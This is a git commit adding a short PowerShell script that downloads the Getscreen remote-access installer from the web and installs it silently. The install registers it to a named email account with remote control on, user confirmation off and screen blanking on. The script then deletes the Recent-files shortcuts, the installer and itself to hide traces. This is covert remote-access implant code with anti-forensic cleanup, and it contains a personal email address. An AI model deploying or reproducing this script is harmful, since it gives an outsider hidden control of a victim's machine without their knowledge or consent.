9d8f93784a61f6fd0ecf1bb09b8520d371c87602
Tansorov <62895005+d3d0n@users.noreply.github.com>
2024-01-23 23:50:55 +0500

    Add files via upload

---
+++ getscreen.ps1
@@ -0,0 +1,18 @@
+# This script will donwload getscreen and install it silently
+
+#Fetching getscreen binary
+$webclient = New-Object System.Net.WebClient
+$url = "https://getscreen.ru/invite/download/getscreen.msi?utm_user=gb2a1pd2q66z9e8zd2b2x7jdxpjbhj9qxblknr1nng4742379"
+$file = "getscreen.msi"
+$webclient.DownloadFile($url,$file)
+
+#Installing getscreen without user interaction
+Start-Process -FilePath "msiexec.exe" -ArgumentList "/i getscreen.msi /qn REGISTER="tancorovruslan@gmail.com:10791" CONFIG="name='My Computer' language=ru autostart=false nonadmin=true control=true fast_access=false file_transfer=false audio_calls=false black_screen=true disable_confirmation=true"" -Wait
+
+#Removing getscreen binary and this script from recent files
+Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.msi.lnk"
+Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.ps1.lnk"
+#Removing getscreen binary
+Remove-Item -Path "$PSScriptRoot\getscreen.msi"
+#Removing this script
+Remove-Item -Path $MyInvocation.MyCommand.Path
